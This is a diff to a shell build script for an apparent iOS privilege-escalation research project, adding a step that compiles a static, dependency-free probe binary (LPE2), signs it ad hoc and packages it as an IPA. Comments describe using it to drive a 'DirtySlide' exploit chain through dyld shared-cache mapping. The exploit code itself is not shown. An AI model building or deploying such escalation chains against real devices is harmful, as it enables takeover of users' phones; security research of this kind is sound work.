@@ -11,6 +11,7 @@ set -e
 SDK=$(xcrun --sdk iphoneos --show-sdk-path)
 ARCH=arm64
 DIST=dist
+DIST2=dist2
 APP="$DIST/Payload/LPE.app"
 CC="clang -arch $ARCH -isysroot $SDK -miphoneos-version-min=16.0 -O0 -g -Wall -fno-stack-protector"
 
@@ -56,6 +57,37 @@ PLIST
 codesign -s - --force "$APP/libchild.dylib" 2>/dev/null || true
 codesign -s - --force "$APP/LPE" 2>/dev/null || true
 
+# ---- static, dependency-free probe (LPE2) -------------------------------------
+# A binary with no dylib dependencies gives dyld nothing to map; if the shared-cache
+# region therefore stays empty (sr_first_mapping == -1), the process itself becomes a
+# viable #536 first-mapper and the DirtySlide chain needs no child process at all.
+APP2="$DIST2/Payload/LPE2.app"
+mkdir -p "$APP2"
+$CC -nostdlib -fno-stack-protector -Wl,-static -Wl,-e,_start -Wl,-no_pie -o "$APP2/LPE2" probe_static.c
+cat > "$APP2/Info.plist" <<PLIST2
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>CFBundleExecutable</key><string>LPE2</string>
+  <key>CFBundleIdentifier</key><string>com.lab.lpe2</string>
+  <key>CFBundleName</key><string>LPE2</string>
+  <key>CFBundleVersion</key><string>1.0</string>
+  <key>CFBundleShortVersionString</key><string>1.0</string>
+  <key>CFBundlePackageType</key><string>APPL</string>
+  <key>LSRequiresIPhoneOS</key><true/>
+  <key>MinimumOSVersion</key><string>16.0</string>
+  <key>UIDeviceFamily</key><array><integer>1</integer></array>
+  <key>UILaunchScreen</key><dict/>
+</dict>
+</plist>
+PLIST2
+codesign -s - --force "$APP2/LPE2" 2>/dev/null || true
+cd "$DIST2"
+rm -f LPE2.ipa
+zip -q -r -X LPE2.ipa Payload
+cd ..
+echo "[+] built dist2/LPE2.ipa"
 cd "$DIST"
 rm -f LPE.ipa
 zip -q -r -X LPE.ipa Payload
